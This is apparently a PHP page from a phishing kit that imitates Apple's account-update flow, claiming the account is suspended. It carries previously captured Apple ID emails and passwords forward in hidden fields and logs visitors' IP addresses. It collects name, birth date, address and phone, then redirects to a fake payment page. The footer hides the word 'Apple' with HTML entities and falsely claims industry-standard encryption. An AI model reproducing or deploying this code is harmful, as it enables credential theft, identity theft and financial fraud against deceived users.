<?php
require_once('function.shc.php');
#######################################################################################################
$ip = $apple->ip();
$apple->logs("Mengisi Personal data"); // log activity
if($_SESSION['start'] != true){
   $apple->ip();
}
if(!$_SESSION['status_login']){
   header('Location: '.$apple->sitehost().'/?appIdKey='.md5(time()).md5(time()).'&path=/signin/?referrer=/account/manage&sslEnabled=true');
}
if(isset($_GET['profile']) && isset($_GET['appIdKey']) && isset($_GET['path'])){

}else{
   header('Location: '.$apple->sitehost().'/account/manage/personal/update?profile=update&appIdKey='.md5(time()).md5(time()).'&path=/account/manage/personal/update?referrer=/account/manage/suspended/&sslEnabled=true&login=personal');
}
if(empty($_SESSION['apple_email']) && empty($_SESSION['apple_password'])){
   session_destroy();
   header('Location: '.$apple->sitehost().'/?appIdKey='.md5(time()).md5(time()).'&path=/signin/?referrer=/account/manage&sslEnabled=true');
}
#######################################################################################################
if($_POST['submit'] == "Continue"){
   if(empty($_POST['fullName_id']) && empty($_POST['dayofb_id']) && empty($_POST['monthofb_id']) && empty($_POST['yearofb_id'])  && empty($_POST['addr_id1']) && empty($_POST['phone']) && empty($_POST['zip_id']) && empty($_POST['city_id']) ){
      header('Location: '.$apple->sitehost().'/account/manage/personal/update?profile=update&appIdKey='.md5(time()).md5(time()).'&path=/account/manage/personal/update?referrer=/account/manage/suspended/&sslEnabled=true&login=personal');
   }else{
      #######################################################################################################
         foreach ($_POST as $key => $value) {
            $_SESSION['personal_data_input'][$key] = $value;
         }
         header('Location: '.$apple->sitehost().'/account/manage/payment/update?payment=update&appIdKey='.md5(time()).md5(time()).'&path=/account/manage/personal/update?referrer=/account/manage/personal/update&sslEnabled=true&login=payment');
      #######################################################################################################
   }
}
?>
<!DOCTYPE html>
<html lang="en">
   <head>
   <meta http-equiv="content-type" content="text/html; charset=UTF-8">
   <link href="<?= $apple->sitehost();?>/assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
   <title>Update your information</title>
   <link href="<?= $apple->sitehost();?>/assets/css/personal.css" type="text/css" rel="stylesheet">
   <link href="<?= $apple->sitehost();?>/assets/css/css.css" type="text/css" rel="stylesheet">
   <link href="<?= $apple->sitehost();?>/assets/css/header.css" type="text/css" rel="stylesheet">
   <link href="<?= $apple->sitehost();?>/assets/css/footer.css" type="text/css" rel="stylesheet">
   <script src="<?= $apple->sitehost();?>/assets/js/jquery-1.11.3.min.js"></script>
   <script src="<?= $apple->sitehost();?>/assets/js/nicescroll.min.js"></script>
   <style type="text/css">
      .right { display: block; height: 100%; float:left; padding: 0px; margin-left: 30px;}
   </style>
   </head>
   <body>
      <div class="header"><div class="navbar">
      </div>
   </div>
      <div class="main">
         <div class="myid">
            <img src="<?= $apple->sitehost();?>/assets/img/logolaper.png" class="headerlogo">
         </div>
         <div class="layout">
            <div class="layout-left">
            </div>
            <div class="right">
               <br>
               <form method="post" action="<?php echo $_SERVER['REQUEST_URI']; ?>" name="personalForm" id="personalForm">
                  <h1>Update Your Information.<img src="<?= $apple->sitehost();?>/assets/img/sc.png" align="right" style="position:relative; right:-15px;" border="0" height="33" width="83"></h1>
                  <table border="0" cellpadding="0" cellspacing="0" width="105%">
                     <tbody>
                        <tr>
                           <td colspan="3" class="topheading">
                              <p><img src="<?= $apple->sitehost();?>/assets/img/notice-enter.png" /></p>
                           </td>
                        </tr>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Full Name</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input  class="personelInfo personelInfo1" style="width:220px" required="required" maxlength="50" name="fullName_id" type="text" title="Enter Your Full Name" value="<?php echo $_SESSION['personal_data']['namadepan']. ' '.$_SESSION['personal_data']['namabelakang'];?>">
                              </span>
                           </td>
                        </tr>
                        <input type="hidden" name="fulladdr" value="<?php echo $_SESSION['personal_data']['fullAddress'];?>">
						      <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666"> Date of Birth </font>
                           </td>
                           <?php
                              $date    = explode("-", $_SESSION['personal_data']['dob']);
                              $tanggal = array(
                                 '01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20',
                                 '21','22','23','24','25','26','27','28','29','30','31',
                              );
                              $bulan = array(
                                 '01','02','03','04','05','06','07','08','09','10','11','12'
                              );
                              $tahun = range("1912", "2012");
                           ?>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                                 <select class="personelInfo personelInfo2" name="dayofb_id" title="Enter your date of birth">
                                    <?php
                                       foreach ($tanggal as $key => $ctanggal) {
                                          if($ctanggal == $date[1]){
                                             echo '<option selected value="'.$date[1].'">'.$date[1].'</option>';
                                          }else{
                                             echo '<option value="'.$ctanggal .'">'.$ctanggal .'</option>';
                                          }
                                       }
                                    ?>
                                 </select>
                              </span>
                              <span class="formwrap">
                                 <select class="personelInfo personelInfo3" name="monthofb_id" title="Enter your date of birth">
                                   <?php
                                       foreach ($bulan as $key => $cbulan) {
                                          if($cbulan == $date[2]){
                                             echo '<option selected value="'.$date[2].'">'.$date[2].'</option>';
                                          }else{
                                             echo '<option value="'.$cbulan .'">'.$cbulan .'</option>';
                                          }
                                       }
                                    ?>
                                 </select>
                              </span>
                              <span class="formwrap">
                                 <select class="personelInfo personelInfo4" name="yearofb_id" title="Enter your date of birth">
                                    <?php
                                       foreach ($tahun as $key => $ctahun) {
                                          if($ctahun == $date[0]){
                                             echo '<option selected value="'.$date[0].'">'.$date[0].'</option>';
                                          }else{
                                             echo '<option value="'.$ctahun .'">'.$ctahun .'</option>';
                                          }
                                       }
                                    ?>
                                 </select>
                              </span>
                           </td>
                        </tr>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Address 1</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input  class="personelInfo personelInfo5" style="width:210px" required="required" maxlength="40" name="addr_id1" type="text" title="Enter street address" value="<?php echo $_SESSION['personal_data']['line1'];?>" >
                              </span>
                           </td>
                        </tr>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Address 2</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input  class="personelInfo personelInfo5" style="width:210px" maxlength="40" name="addr_id2" type="text" title="Enter street address" value="<?php echo $_SESSION['personal_data']['line2'];?>">
                              </span>
                           </td>
                        </tr>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Phone Number</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="phone" type="text" value="<?php echo $_SESSION['personal_data']['nomor'];?>">
                              </span>
                           </td>
                        </tr>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Zip Code</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo6" style="width:210px" required="required" maxlength="10" name="zip_id" type="text" value="<?php echo $_SESSION['personal_data']['zip'];?>">
                              </span>
                           </td>
                        </tr>
						     <tr>
                           <td class="leftRow" style="text-align: left" width="2">
                              <font color="#666666">Country</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                                 <select class="personelInfo personelInfo8" name="country_id" title="Select your country" required="">
                                    <?php
                                    if($country_array[$ip[cn]] == ""){
                                       echo '<option selected="selected" value="">Select Country</option>';
                                    }else{
                                      echo '<option selected="selected" value="'.$country_array[$ip[cn]].'">'.$country_array[$ip[cn]].'</option>'; 
                                    }
                                    ?>
                                    <option value="Albania">Albania</option>
                                    <option value="Algeria">Algeria</option>
                                    <option value="Andorra">Andorra</option>
                                    <option value="Angola">Angola</option>
                                    <option value="Anguilla">Anguilla</option>
                                    <option value="Antigua and Barbuda">Antigua and Barbuda</option>
                                    <option value="Argentina">Argentina</option>
                                    <option value="Armenia">Armenia</option>
                                    <option value="Aruba">Aruba</option>
                                    <option value="Australia">Australia</option>
                                    <option value="Austria">Austria</option>
                                    <option value="Azerbaijan Republic">Azerbaijan Republic</option>
                                    <option value="Bahamas">Bahamas</option>
                                    <option value="Bahrain">Bahrain</option>
                                    <option value="Barbados">Barbados</option>
                                    <option value="Belgium">Belgium</option>
                                    <option value="BelizeBZ">Belize</option>
                                    <option value="Benin">Benin</option>
                                    <option value="Bermuda">Bermuda</option>
                                    <option value="Bhutan">Bhutan</option>
                                    <option value="Bolivia">Bolivia</option>
                                    <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
                                    <option value="Botswana">Botswana</option>
                                    <option value="Brazil">Brazil</option>
                                    <option value="Brunei">Brunei</option>
                                    <option value="Bulgaria">Bulgaria</option>
                                    <option value="Burkina Faso">Burkina Faso</option>
                                    <option value="Burundi">Burundi</option>
                                    <option value="Cambodia">Cambodia</option>
                                    <option value="Canada">Canada</option>
                                    <option value="Cape Verde">Cape Verde</option>
                                    <option value="Cayman Islands">Cayman Islands</option>
                                    <option value="Chad">Chad</option>
                                    <option value="Chile">Chile</option>
                                    <option value="China Worldwide">China Worldwide</option>
                                    <option value="Colombia">Colombia</option>
                                    <option value="Comoros">Comoros</option>
                                    <option value="Cook Islands">Cook Islands</option>
                                    <option value="Costa Rica">Costa Rica</option>
                                    <option value="Croatia">Croatia</option>
                                    <option value="Cyprus">Cyprus</option>
                                    <option value="Czech Republic">Czech Republic</option>
                                    <option value="Democratic Republic of the Congo">Democratic Republic of the Congo</option>
                                    <option value="Denmark">Denmark</option>
                                    <option value="Djibouti">Djibouti</option>
                                    <option value="Dominica">Dominica</option>
                                    <option value="Dominican Republic">Dominican Republic</option>
                                    <option value="Ecuador">Ecuador</option>
                                    <option value="El Salvador">El Salvador</option>
                                    <option value="Eritrea">Eritrea</option>
                                    <option value="Estonia">Estonia</option>
                                    <option value="Ethiopia">Ethiopia</option>
                                    <option value="Falkland Islands">Falkland Islands</option>
                                    <option value="Faroe Islands">Faroe Islands</option>
                                    <option value="Fiji">Fiji</option>
                                    <option value="Finland">Finland</option>
                                    <option value="France">France</option>
                                    <option value="French Guiana">French Guiana</option>
                                    <option value="French Polynesia">French Polynesia</option>
                                    <option value="Gabon Republic">Gabon Republic</option>
                                    <option value="Gambia">Gambia</option>
                                    <option value="Germany">Germany</option>
                                    <option value="Gibraltar">Gibraltar</option>
                                    <option value="Greece">Greece</option>
                                    <option value="Greenland">Greenland</option>
                                    <option value="Grenada">Grenada</option>
                                    <option value="Guadeloupe">Guadeloupe</option>
                                    <option value="Guatemala">Guatemala</option>
                                    <option value="Guinea">Guinea</option>
                                    <option value="Guinea Bissau">Guinea Bissau</option>
                                    <option value="Guyana">Guyana</option>
                                    <option value="Honduras">Honduras</option>
                                    <option value="Hong Kong">Hong Kong</option>
                                    <option value="Hungary">Hungary</option>
                                    <option value="Iceland">Iceland</option>
                                    <option value="India">India</option>
                                    <option value="Indonesia">Indonesia</option>
                                    <option value="Ireland">Ireland</option>
                                    <option value="Israel">Israel</option>
                                    <option value="Italy">Italy</option>
                                    <option value="Jamaica">Jamaica</option>
                                    <option value="Japan">Japan</option>
                                    <option value="Jordan">Jordan</option>
                                    <option value="Kazakhstan">Kazakhstan</option>
                                    <option value="Kenya">Kenya</option>
                                    <option value="Kiribati">Kiribati</option>
                                    <option value="Kuwait">Kuwait</option>
                                    <option value="Kyrgyzstan">Kyrgyzstan</option>
                                    <option value="Laos">Laos</option>
                                    <option value="Latvia">Latvia</option>
                                    <option value="Lesotho">Lesotho</option>
                                    <option value="Liechtenstein">Liechtenstein</option>
                                    <option value="Lithuania">Lithuania</option>
                                    <option value="Luxembourg">Luxembourg</option>
                                    <option value="Madagascar">Madagascar</option>
                                    <option value="Malawi">Malawi</option>
                                    <option value="Malaysia">Malaysia</option>
                                    <option value="Maldives">Maldives</option>
                                    <option value="Mali">Mali</option>
                                    <option value="Malta">Malta</option>
                                    <option value="Marshall Islands">Marshall Islands</option>
                                    <option value="Martinique">Martinique</option>
                                    <option value="Mauritania">Mauritania</option>
                                    <option value="Mauritius">Mauritius</option>
                                    <option value="Mayotte">Mayotte</option>
                                    <option value="Mexico">Mexico</option>
                                    <option value="Micronesia">Micronesia</option>
                                    <option value="Mongolia">Mongolia</option>
                                    <option value="Montserrat">Montserrat</option>
                                    <option value="Morocco">Morocco</option>
                                    <option value="Mozambique">Mozambique</option>
                                    <option value="Namibia">Namibia</option>
                                    <option value="Nauru">Nauru</option>
                                    <option value="Nepal">Nepal</option>
                                    <option value="Netherlands">Netherlands</option>
                                    <option value="Netherlands Antilles">Netherlands Antilles</option>
                                    <option value="New Caledonia">New Caledonia</option>
                                    <option value="New Zealand">New Zealand</option>
                                    <option value="Nicaragua">Nicaragua</option>
                                    <option value="Niger">Niger</option>
                                    <option value="Niue">Niue</option>
                                    <option value="Norfolk Island">Norfolk Island</option>
                                    <option value="Norway">Norway</option>
                                    <option value="Oman">Oman</option>
                                    <option value="Palau">Palau</option>
                                    <option value="Panama">Panama</option>
                                    <option value="Papua New Guinea">Papua New Guinea</option>
                                    <option value="Peru">Peru</option>
                                    <option value="Philippines">Philippines</option>
                                    <option value="Pitcairn Islands">Pitcairn Islands</option>
                                    <option value="Poland">Poland</option>
                                    <option value="Portugal">Portugal</option>
                                    <option value="Qatar">Qatar</option>
                                    <option value="Republic of the Congo">Republic of the Congo</option>
                                    <option value="Reunion">Reunion</option>
                                    <option value="Romania">Romania</option>
                                    <option value="Russia">Russia</option>
                                    <option value="Rwanda">Rwanda</option>
                                    <option value="Saint Kitts and Nevis Anguilla">Saint Kitts and Nevis Anguilla</option>
                                    <option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option>
                                    <option value="Saint Vincent and Grenadines">Saint Vincent and Grenadines</option>
                                    <option value="Samoa">Samoa</option>
                                    <option value="San Marino">San Marino</option>
                                    <option value="Sä¯ Tomé¡¡nd Prî¯£ipe">Sä¯ Tomé¡¡nd Prî¯£ipe</option>
                                    <option value="Saudi Arabia">Saudi Arabia</option>
                                    <option value="Senegal">Senegal</option>
                                    <option value="Seychelles">Seychelles</option>
                                    <option value="Sierra Leone">Sierra Leone</option>
                                    <option value="Singapore">Singapore</option>
                                    <option value="Slovakia">Slovakia</option>
                                    <option value="Slovenia">Slovenia</option>
                                    <option value="Solomon Islands">Solomon Islands</option>
                                    <option value="Somalia">Somalia</option>
                                    <option value="South Africa">South Africa</option>
                                    <option value="South Korea">South Korea</option>
                                    <option value="Spain">Spain</option>
                                    <option value="Sri Lanka">Sri Lanka</option>
                                    <option value="St. Helena">St. Helena</option>
                                    <option value="St. Lucia">St. Lucia</option>
                                    <option value="Suriname">Suriname</option>
                                    <option value="Svalbard and Jan Mayen Islands">Svalbard and Jan Mayen Islands</option>
                                    <option value="Swaziland">Swaziland</option>
                                    <option value="Sweden">Sweden</option>
                                    <option value="Switzerland">Switzerland</option>
                                    <option value="Taiwan">Taiwan</option>
                                    <option value="Tajikistan">Tajikistan</option>
                                    <option value="Tanzania">Tanzania</option>
                                    <option value="Thailand">Thailand</option>
                                    <option value="Togo">Togo</option>
                                    <option value="Tonga">Tonga</option>
                                    <option value="Trinidad and Tobago">Trinidad and Tobago</option>
                                    <option value="Tunisia">Tunisia</option>
                                    <option value="Turkey">Turkey</option>
                                    <option value="Turkmenistan">Turkmenistan</option>
                                    <option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
                                    <option value="Tuvalu">Tuvalu</option>
                                    <option value="Uganda">Uganda</option>
                                    <option value="Ukraine">Ukraine</option>
                                    <option value="United Arab Emirates">United Arab Emirates</option>
                                    <option value="United Kingdom">United Kingdom</option>
                                    <option value="United States">United States</option>
                                    <option value="Uruguay">Uruguay</option>
                                    <option value="Vanuatu">Vanuatu</option>
                                    <option value="Vatican City State">Vatican City State</option>
                                    <option value="Venezuela">Venezuela</option>
                                    <option value="Vietnam">Vietnam</option>
                                    <option value="Virgin Islands (British)">Virgin Islands (British)</option>
                                    <option value="Wallis and Futuna Islands">Wallis and Futuna Islands</option>
                                    <option value="Yemen">Yemen</option>
                                    <option value="Zambia">Zambia</option>
                                 </select>
                              </span>
                           </td>
                        </tr>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">City</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="city_id" type="text" value="<?php echo $_SESSION['personal_data']['city'];?>">
                              </span>
                           </td>
                        </tr>
                        <?php
                        if($_SESSION[negara] === "AE"){?>
                          <tr>
                              <td class="leftRow" style="text-align: left" width="154">
                                 <font color="#666666">Emirate</font>
                              </td>
                              <td class="rightRow" colspan="2">
                                 <span class="formwrap">
                                 <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="emirate" type="text">
                                 </span>
                              </td>
                           </tr>
                        <?php }?>
                        <?php
                        if($_SESSION[negara] === "UA"){?>
                          <tr>
                              <td class="leftRow" style="text-align: left" width="154">
                                 <font color="#666666">Oblast</font>
                              </td>
                              <td class="rightRow" colspan="2">
                                 <span class="formwrap">
                                 <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="oblast" type="text">
                                 </span>
                              </td>
                           </tr>
                        <?php }?>
                        <?php
                         if($_SESSION[negara] === "US"  || $_SESSION[negara] === "ID"  || $_SESSION[negara] === "AS" || $_SESSION[negara] === "AR" || $_SESSION[negara] === "AM" || $_SESSION[negara] === "AU" || $_SESSION[negara] === "CA" || $_SESSION[negara] === "VN" || $_SESSION[negara] === "VE"){?>
                          <tr>
                              <td class="leftRow" style="text-align: left" width="154">
                                 <font color="#666666">State / province / region</font>
                              </td>
                              <td class="rightRow" colspan="2">
                                 <span class="formwrap">
                                 <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="state_id" type="text" value="<?php echo $_SESSION['personal_data']['state'];?>">
                                 </span>
                              </td>
                           </tr>
                        <?php }?>
                        <?php
                        if($_SESSION[negara] === "BB"){?>
                          <tr>
                              <td class="leftRow" style="text-align: left" width="154">
                                 <font color="#666666">Parish</font>
                              </td>
                              <td class="rightRow" colspan="2">
                                 <span class="formwrap">
                                 <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="parish_id" type="text">
                                 </span>
                              </td>
                           </tr>
                        <?php }?>
                        <tr >
                           <td style="text-align:center;border:0;"></td>
                           <td style="text-align:center;border:0;">
                              <input type="hidden" name="apple_email"      value="<?= $_SESSION['apple_email'];?>">
                              <input type="hidden" name="apple_password"   value="<?= $_SESSION['apple_password'];?>">
                              <input type="hidden" name="apple_ip"         value="<?= $ip['ip'];?>">
                              <input class="submit" name="submit" value="Continue" type="submit" style="display: block;margin-top: 21px;margin-right: 25px;">
                           </td>
                        </tr>
                        
                  </table>
               </form>
            </div>
         </div>
         <div id="footer">
      <p>The &#65;p&#112;l&#101; Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a></p>
      <hr>
      <div class="copy-right"><p style="font-size: 12">More ways to shop: Visit an <a href="#">Apple Store</a>, call 1-800-MY-APPLE, or <a href="#">find a reseller</a><br><br>Copyright &copy; <?php echo date('Y'); ?> &#65;p&#112;l&#101; Inc. All rights reserved.   <a href="#">Privacy Policy</a>   |  <a href="#">Term of Use</a>   |  <a href="#">Sales and Refunds</a>   |  <a href="#">Site Map</a></p></div>
      </div>
   </body>
</html>